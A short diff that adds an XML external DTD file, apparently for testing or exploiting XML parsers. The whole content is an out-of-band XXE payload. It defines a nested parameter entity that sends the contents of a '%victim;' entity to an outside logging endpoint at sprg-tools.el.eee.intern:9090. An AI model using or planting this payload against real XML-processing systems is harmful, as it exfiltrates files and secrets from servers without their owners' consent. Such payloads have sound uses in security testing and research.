@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://sprg-tools.el.eee.intern:9090/log?msg=%victim;'>">
+%all;
